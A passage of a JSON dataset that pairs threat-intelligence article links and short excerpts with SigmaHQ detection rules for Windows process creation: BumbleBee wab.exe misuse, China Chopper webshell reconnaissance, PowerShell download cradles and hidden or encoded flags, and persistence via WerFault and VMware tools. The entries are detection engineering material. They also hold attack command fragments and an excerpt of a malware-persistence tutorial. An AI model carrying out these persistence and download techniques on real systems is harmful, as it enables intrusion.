    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_vmware_toolbox_cmd_persistence.yml"
  },
  "632": {
    "url": "https://www.hexacorn.com/blog/2017/01/14/beyond-good-ol-run-key-part-53/",
    "markdown": "",
    "sigma_rule": {
      "title": "Potential Persistence Via VMwareToolBoxCmd.EXE VM State Change Script",
      "id": "7aa4e81a-a65c-4e10-9f81-b200eb229d7d",
      "related": [
        {
          "id": "236d8e89-ed95-4789-a982-36f4643738ba",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects execution of the \"VMwareToolBoxCmd.exe\" with the \"script\" and \"set\" flag to setup a specific script to run for a specific VM state",
      "references": [
        "https://bohops.com/2021/10/08/analyzing-and-detecting-a-vmtools-persistence-technique/",
        "https://www.hexacorn.com/blog/2017/01/14/beyond-good-ol-run-key-part-53/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-06-14",
      "tags": [
        "attack.execution",
        "attack.persistence",
        "attack.t1059"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\VMwareToolBoxCmd.exe"
          },
          {
            "OriginalFileName": "toolbox-cmd.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            " script ",
            " set "
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_vmware_toolbox_cmd_persistence.yml"
  },
  "633": {
    "url": "https://thedfirreport.com/2022/08/08/bumblebee-roasts-its-way-to-domain-admin/",
    "markdown": "# BumbleBee Roasts Its Way to Domain Admin **Categories:** AdFind, BumbleBee, Cobalt Strike, Kerberoast, ShareFinder **Published Date:** August 8, 2022 --- ## Introduction In this intrusion from April 2022, the threat actors used BumbleBee as the initial access vector. BumbleBee is a malware loader first reported by Google Threat Analysis Group in March 2022. Google TAG attributes this malware to an initial access broker (IAB) dubbed EXOTIC LILY, working with the cybercrime group FIN12/WIZARD SPIDER/DEV-0193. Read more about BumbleBee here and here. During this intrusion, the threat actors gained access using an ISO and LNK file, used several lateral movement",
    "sigma_rule": {
      "title": "Wab Execution From Non Default Location",
      "id": "395907ee-96e5-4666-af2e-2ca91688e151",
      "status": "test",
      "description": "Detects execution of wab.exe (Windows Contacts) and Wabmig.exe (Microsoft Address Book Import Tool) from non default locations as seen with bumblebee activity",
      "references": [
        "https://thedfirreport.com/2022/08/08/bumblebee-roasts-its-way-to-domain-admin/",
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/bumblebee-loader-cybercrime",
        "https://thedfirreport.com/2022/09/26/bumblebee-round-two/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-08-12",
      "modified": "2022-09-27",
      "tags": [
        "attack.defense-evasion",
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\wab.exe",
            "\\wabmig.exe"
          ]
        },
        "filter": {
          "Image|startswith": [
            "C:\\Windows\\WinSxS\\",
            "C:\\Program Files\\Windows Mail\\",
            "C:\\Program Files (x86)\\Windows Mail\\"
          ]
        },
        "condition": "selection and not filter"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wab_execution_from_non_default_location.yml"
  },
  "634": {
    "url": "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/bumblebee-loader-cybercrime",
    "markdown": "",
    "sigma_rule": {
      "title": "Wab Execution From Non Default Location",
      "id": "395907ee-96e5-4666-af2e-2ca91688e151",
      "status": "test",
      "description": "Detects execution of wab.exe (Windows Contacts) and Wabmig.exe (Microsoft Address Book Import Tool) from non default locations as seen with bumblebee activity",
      "references": [
        "https://thedfirreport.com/2022/08/08/bumblebee-roasts-its-way-to-domain-admin/",
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/bumblebee-loader-cybercrime",
        "https://thedfirreport.com/2022/09/26/bumblebee-round-two/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-08-12",
      "modified": "2022-09-27",
      "tags": [
        "attack.defense-evasion",
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\wab.exe",
            "\\wabmig.exe"
          ]
        },
        "filter": {
          "Image|startswith": [
            "C:\\Windows\\WinSxS\\",
            "C:\\Program Files\\Windows Mail\\",
            "C:\\Program Files (x86)\\Windows Mail\\"
          ]
        },
        "condition": "selection and not filter"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wab_execution_from_non_default_location.yml"
  },
  "635": {
    "url": "https://thedfirreport.com/2022/09/26/bumblebee-round-two/",
    "markdown": "# BumbleBee: Round Two **Categories:** adfind, bumblebee, cobaltstrike, Meterpreter **Published on:** September 26, 2022 In this intrusion from May 2022, the threat actors used BumbleBee as the initial access vector. BumbleBee has been identified as an initial access vector utilized by several ransomware affiliates. In this intrusion, we see the threat actor use BumbleBee to deploy Cobalt Strike and Meterpreter. The threat actor then used RDP and SMB to move around the network looking at backup systems and file shares before being evicted from the network. ## Case Summary The intrusion began with the delivery of an ISO file containing",
    "sigma_rule": {
      "title": "Wab Execution From Non Default Location",
      "id": "395907ee-96e5-4666-af2e-2ca91688e151",
      "status": "test",
      "description": "Detects execution of wab.exe (Windows Contacts) and Wabmig.exe (Microsoft Address Book Import Tool) from non default locations as seen with bumblebee activity",
      "references": [
        "https://thedfirreport.com/2022/08/08/bumblebee-roasts-its-way-to-domain-admin/",
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/bumblebee-loader-cybercrime",
        "https://thedfirreport.com/2022/09/26/bumblebee-round-two/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-08-12",
      "modified": "2022-09-27",
      "tags": [
        "attack.defense-evasion",
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\wab.exe",
            "\\wabmig.exe"
          ]
        },
        "filter": {
          "Image|startswith": [
            "C:\\Windows\\WinSxS\\",
            "C:\\Program Files\\Windows Mail\\",
            "C:\\Program Files (x86)\\Windows Mail\\"
          ]
        },
        "condition": "selection and not filter"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wab_execution_from_non_default_location.yml"
  },
  "636": {
    "url": "https://thedfirreport.com/2022/08/08/bumblebee-roasts-its-way-to-domain-admin/",
    "markdown": "# BumbleBee Roasts Its Way to Domain Admin **Categories:** AdFind, BumbleBee, Cobalt Strike, Kerberoast, ShareFinder **Published Date:** August 8, 2022 --- ## Introduction In this intrusion from April 2022, the threat actors used BumbleBee as the initial access vector. BumbleBee is a malware loader first reported by Google Threat Analysis Group in March 2022. Google TAG attributes this malware to an initial access broker (IAB) dubbed EXOTIC LILY, working with the cybercrime group FIN12/WIZARD SPIDER/DEV-0193. Read more about BumbleBee here and here. During this intrusion, the threat actors gained access using an ISO and LNK file, used several lateral movement",
    "sigma_rule": {
      "title": "Wab/Wabmig Unusual Parent Or Child Processes",
      "id": "63d1ccc0-2a43-4f4b-9289-361b308991ff",
      "status": "test",
      "description": "Detects unusual parent or children of the wab.exe (Windows Contacts) and Wabmig.exe (Microsoft Address Book Import Tool) processes as seen being used with bumblebee activity",
      "references": [
        "https://thedfirreport.com/2022/08/08/bumblebee-roasts-its-way-to-domain-admin/",
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/bumblebee-loader-cybercrime",
        "https://thedfirreport.com/2022/09/26/bumblebee-round-two/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-08-12",
      "modified": "2022-09-27",
      "tags": [
        "attack.defense-evasion",
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_parent": {
          "ParentImage|endswith": [
            "\\WmiPrvSE.exe",
            "\\svchost.exe",
            "\\dllhost.exe"
          ],
          "Image|endswith": [
            "\\wab.exe",
            "\\wabmig.exe"
          ]
        },
        "selection_child": {
          "ParentImage|endswith": [
            "\\wab.exe",
            "\\wabmig.exe"
          ]
        },
        "condition": "1 of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wab_unusual_parents.yml"
  },
  "637": {
    "url": "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/bumblebee-loader-cybercrime",
    "markdown": "",
    "sigma_rule": {
      "title": "Wab/Wabmig Unusual Parent Or Child Processes",
      "id": "63d1ccc0-2a43-4f4b-9289-361b308991ff",
      "status": "test",
      "description": "Detects unusual parent or children of the wab.exe (Windows Contacts) and Wabmig.exe (Microsoft Address Book Import Tool) processes as seen being used with bumblebee activity",
      "references": [
        "https://thedfirreport.com/2022/08/08/bumblebee-roasts-its-way-to-domain-admin/",
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/bumblebee-loader-cybercrime",
        "https://thedfirreport.com/2022/09/26/bumblebee-round-two/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-08-12",
      "modified": "2022-09-27",
      "tags": [
        "attack.defense-evasion",
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_parent": {
          "ParentImage|endswith": [
            "\\WmiPrvSE.exe",
            "\\svchost.exe",
            "\\dllhost.exe"
          ],
          "Image|endswith": [
            "\\wab.exe",
            "\\wabmig.exe"
          ]
        },
        "selection_child": {
          "ParentImage|endswith": [
            "\\wab.exe",
            "\\wabmig.exe"
          ]
        },
        "condition": "1 of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wab_unusual_parents.yml"
  },
  "638": {
    "url": "https://thedfirreport.com/2022/09/26/bumblebee-round-two/",
    "markdown": "# BumbleBee: Round Two **Categories:** adfind, bumblebee, cobaltstrike, Meterpreter **Published on:** September 26, 2022 In this intrusion from May 2022, the threat actors used BumbleBee as the initial access vector. BumbleBee has been identified as an initial access vector utilized by several ransomware affiliates. In this intrusion, we see the threat actor use BumbleBee to deploy Cobalt Strike and Meterpreter. The threat actor then used RDP and SMB to move around the network looking at backup systems and file shares before being evicted from the network. ## Case Summary The intrusion began with the delivery of an ISO file containing",
    "sigma_rule": {
      "title": "Wab/Wabmig Unusual Parent Or Child Processes",
      "id": "63d1ccc0-2a43-4f4b-9289-361b308991ff",
      "status": "test",
      "description": "Detects unusual parent or children of the wab.exe (Windows Contacts) and Wabmig.exe (Microsoft Address Book Import Tool) processes as seen being used with bumblebee activity",
      "references": [
        "https://thedfirreport.com/2022/08/08/bumblebee-roasts-its-way-to-domain-admin/",
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/bumblebee-loader-cybercrime",
        "https://thedfirreport.com/2022/09/26/bumblebee-round-two/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-08-12",
      "modified": "2022-09-27",
      "tags": [
        "attack.defense-evasion",
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_parent": {
          "ParentImage|endswith": [
            "\\WmiPrvSE.exe",
            "\\svchost.exe",
            "\\dllhost.exe"
          ],
          "Image|endswith": [
            "\\wab.exe",
            "\\wabmig.exe"
          ]
        },
        "selection_child": {
          "ParentImage|endswith": [
            "\\wab.exe",
            "\\wabmig.exe"
          ]
        },
        "condition": "1 of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wab_unusual_parents.yml"
  },
  "639": {
    "url": "https://www.microsoft.com/en-us/security/blog/2022/09/30/analyzing-attacks-using-the-exchange-vulnerabilities-cve-2022-41040-and-cve-2022-41082/",
    "markdown": "",
    "sigma_rule": {
      "title": "Chopper Webshell Process Pattern",
      "id": "fa3c117a-bc0d-416e-a31b-0c0e80653efb",
      "status": "test",
      "description": "Detects patterns found in process executions cause by China Chopper like tiny (ASPX) webshells",
      "references": [
        "https://www.microsoft.com/en-us/security/blog/2022/09/30/analyzing-attacks-using-the-exchange-vulnerabilities-cve-2022-41040-and-cve-2022-41082/"
      ],
      "author": "Florian Roth (Nextron Systems), MSTI (query)",
      "date": "2022-10-01",
      "tags": [
        "attack.persistence",
        "attack.discovery",
        "attack.t1505.003",
        "attack.t1018",
        "attack.t1033",
        "attack.t1087"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_origin": [
          {
            "Image|endswith": "\\w3wp.exe"
          },
          {
            "ParentImage|endswith": "\\w3wp.exe"
          }
        ],
        "selection_cmdline": {
          "CommandLine|contains": [
            "&ipconfig&echo",
            "&quser&echo",
            "&whoami&echo",
            "&c:&echo",
            "&cd&echo",
            "&dir&echo",
            "&echo [E]",
            "&echo [S]"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_webshell_chopper.yml"
  },
  "640": {
    "url": "https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-ii.html",
    "markdown": "",
    "sigma_rule": {
      "title": "Webshell Detection With Command Line Keywords",
      "id": "bed2a484-9348-4143-8a8a-b801c979301c",
      "status": "test",
      "description": "Detects certain command line parameters often used during reconnaissance activity via web shells",
      "references": [
        "https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-ii.html",
        "https://unit42.paloaltonetworks.com/bumblebee-webshell-xhunt-campaign/",
        "https://www.huntress.com/blog/threat-advisory-oh-no-cleo-cleo-software-actively-being-exploited-in-the-wild"
      ],
      "author": "Florian Roth (Nextron Systems), Jonhnathan Ribeiro, Anton Kutepov, oscd.community, Chad Hudson, Matt Anderson",
      "date": "2017-01-01",
      "modified": "2024-12-14",
      "tags": [
        "attack.persistence",
        "attack.discovery",
        "attack.t1505.003",
        "attack.t1018",
        "attack.t1033",
        "attack.t1087"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_webserver_image": {
          "ParentImage|endswith": [
            "\\w3wp.exe",
            "\\php-cgi.exe",
            "\\nginx.exe",
            "\\httpd.exe",
            "\\caddy.exe",
            "\\ws_tomcatservice.exe"
          ]
        },
        "selection_webserver_characteristics_tomcat1": {
          "ParentImage|endswith": [
            "\\java.exe",
            "\\javaw.exe"
          ],
          "ParentImage|contains": [
            "-tomcat-",
            "\\tomcat"
          ]
        },
        "selection_webserver_characteristics_tomcat2": {
          "ParentImage|endswith": [
            "\\java.exe",
            "\\javaw.exe"
          ],
          "CommandLine|contains": [
            "catalina.jar",
            "CATALINA_HOME"
          ]
        },
        "selection_susp_net_utility": {
          "OriginalFileName": [
            "net.exe",
            "net1.exe"
          ],
          "CommandLine|contains": [
            " user ",
            " use ",
            " group "
          ]
        },
        "selection_susp_ping_utility": {
          "OriginalFileName": "ping.exe",
          "CommandLine|contains": " -n "
        },
        "selection_susp_change_dir": {
          "CommandLine|contains": [
            "&cd&echo",
            "cd /d "
          ]
        },
        "selection_susp_wmic_utility": {
          "OriginalFileName": "wmic.exe",
          "CommandLine|contains": " /node:"
        },
        "selection_susp_powershell_cli": {
          "Image|endswith": [
            "\\cmd.exe",
            "\\powershell.exe",
            "\\pwsh.exe"
          ],
          "CommandLine|contains": [
            " -enc ",
            " -EncodedCommand ",
            " -w hidden ",
            " -windowstyle hidden",
            ".WebClient).Download"
          ]
        },
        "selection_susp_misc_discovery_binaries": [
          {
            "Image|endswith": [
              "\\dsquery.exe",
              "\\find.exe",
              "\\findstr.exe",
              "\\ipconfig.exe",
              "\\netstat.exe",
              "\\nslookup.exe",
              "\\pathping.exe",
              "\\quser.exe",
              "\\schtasks.exe",
              "\\systeminfo.exe",
              "\\tasklist.exe",
              "\\tracert.exe",
              "\\ver.exe",
              "\\wevtutil.exe",
              "\\whoami.exe"
            ]
          },
          {
            "OriginalFileName": [
              "dsquery.exe",
              "find.exe",
              "findstr.exe",
              "ipconfig.exe",
              "netstat.exe",
              "nslookup.exe",
              "pathping.exe",
              "quser.exe",
              "schtasks.exe",
              "sysinfo.exe",
              "tasklist.exe",
              "tracert.exe",
              "ver.exe",
              "VSSADMIN.EXE",
              "wevtutil.exe",
              "whoami.exe"
            ]
          }
        ],
        "selection_susp_misc_discovery_commands": {
          "CommandLine|contains": [
            " Test-NetConnection ",
            "dir \\"
          ]
        },
        "condition": "1 of selection_webserver_* and 1 of selection_susp_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_webshell_recon_commands_and_processes.yml"
  },
  "641": {
    "url": "https://unit42.paloaltonetworks.com/bumblebee-webshell-xhunt-campaign/",
    "markdown": "",
    "sigma_rule": {
      "title": "Webshell Detection With Command Line Keywords",
      "id": "bed2a484-9348-4143-8a8a-b801c979301c",
      "status": "test",
      "description": "Detects certain command line parameters often used during reconnaissance activity via web shells",
      "references": [
        "https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-ii.html",
        "https://unit42.paloaltonetworks.com/bumblebee-webshell-xhunt-campaign/",
        "https://www.huntress.com/blog/threat-advisory-oh-no-cleo-cleo-software-actively-being-exploited-in-the-wild"
      ],
      "author": "Florian Roth (Nextron Systems), Jonhnathan Ribeiro, Anton Kutepov, oscd.community, Chad Hudson, Matt Anderson",
      "date": "2017-01-01",
      "modified": "2024-12-14",
      "tags": [
        "attack.persistence",
        "attack.discovery",
        "attack.t1505.003",
        "attack.t1018",
        "attack.t1033",
        "attack.t1087"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_webserver_image": {
          "ParentImage|endswith": [
            "\\w3wp.exe",
            "\\php-cgi.exe",
            "\\nginx.exe",
            "\\httpd.exe",
            "\\caddy.exe",
            "\\ws_tomcatservice.exe"
          ]
        },
        "selection_webserver_characteristics_tomcat1": {
          "ParentImage|endswith": [
            "\\java.exe",
            "\\javaw.exe"
          ],
          "ParentImage|contains": [
            "-tomcat-",
            "\\tomcat"
          ]
        },
        "selection_webserver_characteristics_tomcat2": {
          "ParentImage|endswith": [
            "\\java.exe",
            "\\javaw.exe"
          ],
          "CommandLine|contains": [
            "catalina.jar",
            "CATALINA_HOME"
          ]
        },
        "selection_susp_net_utility": {
          "OriginalFileName": [
            "net.exe",
            "net1.exe"
          ],
          "CommandLine|contains": [
            " user ",
            " use ",
            " group "
          ]
        },
        "selection_susp_ping_utility": {
          "OriginalFileName": "ping.exe",
          "CommandLine|contains": " -n "
        },
        "selection_susp_change_dir": {
          "CommandLine|contains": [
            "&cd&echo",
            "cd /d "
          ]
        },
        "selection_susp_wmic_utility": {
          "OriginalFileName": "wmic.exe",
          "CommandLine|contains": " /node:"
        },
        "selection_susp_powershell_cli": {
          "Image|endswith": [
            "\\cmd.exe",
            "\\powershell.exe",
            "\\pwsh.exe"
          ],
          "CommandLine|contains": [
            " -enc ",
            " -EncodedCommand ",
            " -w hidden ",
            " -windowstyle hidden",
            ".WebClient).Download"
          ]
        },
        "selection_susp_misc_discovery_binaries": [
          {
            "Image|endswith": [
              "\\dsquery.exe",
              "\\find.exe",
              "\\findstr.exe",
              "\\ipconfig.exe",
              "\\netstat.exe",
              "\\nslookup.exe",
              "\\pathping.exe",
              "\\quser.exe",
              "\\schtasks.exe",
              "\\systeminfo.exe",
              "\\tasklist.exe",
              "\\tracert.exe",
              "\\ver.exe",
              "\\wevtutil.exe",
              "\\whoami.exe"
            ]
          },
          {
            "OriginalFileName": [
              "dsquery.exe",
              "find.exe",
              "findstr.exe",
              "ipconfig.exe",
              "netstat.exe",
              "nslookup.exe",
              "pathping.exe",
              "quser.exe",
              "schtasks.exe",
              "sysinfo.exe",
              "tasklist.exe",
              "tracert.exe",
              "ver.exe",
              "VSSADMIN.EXE",
              "wevtutil.exe",
              "whoami.exe"
            ]
          }
        ],
        "selection_susp_misc_discovery_commands": {
          "CommandLine|contains": [
            " Test-NetConnection ",
            "dir \\"
          ]
        },
        "condition": "1 of selection_webserver_* and 1 of selection_susp_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_webshell_recon_commands_and_processes.yml"
  },
  "642": {
    "url": "https://www.huntress.com/blog/threat-advisory-oh-no-cleo-cleo-software-actively-being-exploited-in-the-wild",
    "markdown": "",
    "sigma_rule": {
      "title": "Webshell Detection With Command Line Keywords",
      "id": "bed2a484-9348-4143-8a8a-b801c979301c",
      "status": "test",
      "description": "Detects certain command line parameters often used during reconnaissance activity via web shells",
      "references": [
        "https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-ii.html",
        "https://unit42.paloaltonetworks.com/bumblebee-webshell-xhunt-campaign/",
        "https://www.huntress.com/blog/threat-advisory-oh-no-cleo-cleo-software-actively-being-exploited-in-the-wild"
      ],
      "author": "Florian Roth (Nextron Systems), Jonhnathan Ribeiro, Anton Kutepov, oscd.community, Chad Hudson, Matt Anderson",
      "date": "2017-01-01",
      "modified": "2024-12-14",
      "tags": [
        "attack.persistence",
        "attack.discovery",
        "attack.t1505.003",
        "attack.t1018",
        "attack.t1033",
        "attack.t1087"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_webserver_image": {
          "ParentImage|endswith": [
            "\\w3wp.exe",
            "\\php-cgi.exe",
            "\\nginx.exe",
            "\\httpd.exe",
            "\\caddy.exe",
            "\\ws_tomcatservice.exe"
          ]
        },
        "selection_webserver_characteristics_tomcat1": {
          "ParentImage|endswith": [
            "\\java.exe",
            "\\javaw.exe"
          ],
          "ParentImage|contains": [
            "-tomcat-",
            "\\tomcat"
          ]
        },
        "selection_webserver_characteristics_tomcat2": {
          "ParentImage|endswith": [
            "\\java.exe",
            "\\javaw.exe"
          ],
          "CommandLine|contains": [
            "catalina.jar",
            "CATALINA_HOME"
          ]
        },
        "selection_susp_net_utility": {
          "OriginalFileName": [
            "net.exe",
            "net1.exe"
          ],
          "CommandLine|contains": [
            " user ",
            " use ",
            " group "
          ]
        },
        "selection_susp_ping_utility": {
          "OriginalFileName": "ping.exe",
          "CommandLine|contains": " -n "
        },
        "selection_susp_change_dir": {
          "CommandLine|contains": [
            "&cd&echo",
            "cd /d "
          ]
        },
        "selection_susp_wmic_utility": {
          "OriginalFileName": "wmic.exe",
          "CommandLine|contains": " /node:"
        },
        "selection_susp_powershell_cli": {
          "Image|endswith": [
            "\\cmd.exe",
            "\\powershell.exe",
            "\\pwsh.exe"
          ],
          "CommandLine|contains": [
            " -enc ",
            " -EncodedCommand ",
            " -w hidden ",
            " -windowstyle hidden",
            ".WebClient).Download"
          ]
        },
        "selection_susp_misc_discovery_binaries": [
          {
            "Image|endswith": [
              "\\dsquery.exe",
              "\\find.exe",
              "\\findstr.exe",
              "\\ipconfig.exe",
              "\\netstat.exe",
              "\\nslookup.exe",
              "\\pathping.exe",
              "\\quser.exe",
              "\\schtasks.exe",
              "\\systeminfo.exe",
              "\\tasklist.exe",
              "\\tracert.exe",
              "\\ver.exe",
              "\\wevtutil.exe",
              "\\whoami.exe"
            ]
          },
          {
            "OriginalFileName": [
              "dsquery.exe",
              "find.exe",
              "findstr.exe",
              "ipconfig.exe",
              "netstat.exe",
              "nslookup.exe",
              "pathping.exe",
              "quser.exe",
              "schtasks.exe",
              "sysinfo.exe",
              "tasklist.exe",
              "tracert.exe",
              "ver.exe",
              "VSSADMIN.EXE",
              "wevtutil.exe",
              "whoami.exe"
            ]
          }
        ],
        "selection_susp_misc_discovery_commands": {
          "CommandLine|contains": [
            " Test-NetConnection ",
            "dir \\"
          ]
        },
        "condition": "1 of selection_webserver_* and 1 of selection_susp_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_webshell_recon_commands_and_processes.yml"
  },
  "643": {
    "url": "https://cocomelonc.github.io/malware/2022/11/02/malware-pers-18.html",
    "markdown": "# Malware development: persistence - part 18. Windows Error Reporting. Simple C++ example. --- ```image Alt: pers Description: The image displays a C++ code snippet for malware persistence via 'WerFault.exe', alongside a Windows PowerShell window showing commands related to registry manipulation. The code includes functions for opening registry keys, setting values, and managing a hijacked application. The PowerShell window shows a query for registry keys linked to Windows Error Reporting, with a dialogue box appearing that responds to the command with 'Meow-meow!'. This technical representation provides insights into malware development techniques. Transcription: | cpp // pers.cpp // windows persistence via",
    "sigma_rule": {
      "title": "Potential ReflectDebugger Content Execution Via WerFault.EXE",
      "id": "fabfb3a7-3ce1-4445-9c7c-3c27f1051cdd",
      "related": [
        {
          "id": "0cf2e1c6-8d10-4273-8059-738778f981ad",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects execution of \"WerFault.exe\" with the \"-pr\" commandline flag that is used to run files stored in the ReflectDebugger key which could be used to store the path to the malware in order to masquerade the execution flow",
      "references": [
        "https://cocomelonc.github.io/malware/2022/11/02/malware-pers-18.html",
        "https://www.hexacorn.com/blog/2018/08/31/beyond-good-ol-run-key-part-85/"
      ],
      "author": "X__Junior (Nextron Systems)",
      "date": "2023-06-30",
      "tags": [
        "attack.execution",
        "attack.defense-evasion",
        "attack.t1036"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\WerFault.exe"
          },
          {
            "OriginalFileName": "WerFault.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": " -pr "
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_werfault_reflect_debugger_exec.yml"
  },
  "644": {
    "url": "https://www.hexacorn.com/blog/2018/08/31/beyond-good-ol-run-key-part-85/",
    "markdown": "# Beyond good ol’ Run key, Part 85 Posted on 2018-08-31 This is a LOLbinish 2-stage persistence trick. One where we add startup items to point to OS binaries, and – while they will be ignored by many users and security solutions (at least at first glance) – they will be launching the second stage of the persistence mechanism for us… Many people who use win7-win10 know that the Werfault.exe process is all over the place. It’s a process ‘repairer’ or ‘fixer’ that handles crashes or other unpleasant activities of other processes. It turns out you can launch werfault.exe with",
    "sigma_rule": {
      "title": "Potential ReflectDebugger Content Execution Via WerFault.EXE",
      "id": "fabfb3a7-3ce1-4445-9c7c-3c27f1051cdd",
      "related": [
        {
          "id": "0cf2e1c6-8d10-4273-8059-738778f981ad",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects execution of \"WerFault.exe\" with the \"-pr\" commandline flag that is used to run files stored in the ReflectDebugger key which could be used to store the path to the malware in order to masquerade the execution flow",
      "references": [
        "https://cocomelonc.github.io/malware/2022/11/02/malware-pers-18.html",
        "https://www.hexacorn.com/blog/2018/08/31/beyond-good-ol-run-key-part-85/"
      ],
      "author": "X__Junior (Nextron Systems)",
      "date": "2023-06-30",
      "tags": [
        "attack.execution",
        "attack.defense-evasion",
        "attack.t1036"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\WerFault.exe"
          },
          {
            "OriginalFileName": "WerFault.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": " -pr "
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_werfault_reflect_debugger_exec.yml"
  },
  "645": {
    "url": "https://www.trendmicro.com/en_us/research/22/j/black-basta-infiltrates-networks-via-qakbot-brute-ratel-and-coba.html",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious Child Process Of Wermgr.EXE",
      "id": "396f6630-f3ac-44e3-bfc8-1b161bc00c4e",
      "related": [
        {
          "id": "5394fcc7-aeb2-43b5-9a09-cac9fc5edcd5",
          "type": "similar"
        }
      ],
      "status": "experimental",
      "description": "Detects suspicious Windows Error Reporting manager (wermgr.exe) child process",
      "references": [
        "https://www.trendmicro.com/en_us/research/22/j/black-basta-infiltrates-networks-via-qakbot-brute-ratel-and-coba.html",
        "https://www.echotrail.io/insights/search/wermgr.exe",
        "https://github.com/binderlabs/DirCreate2System"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-10-14",
      "modified": "2024-08-29",
      "tags": [
        "attack.defense-evasion",
        "attack.privilege-escalation",
        "attack.t1055",
        "attack.t1036"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": "\\wermgr.exe",
          "Image|endswith": [
            "\\cmd.exe",
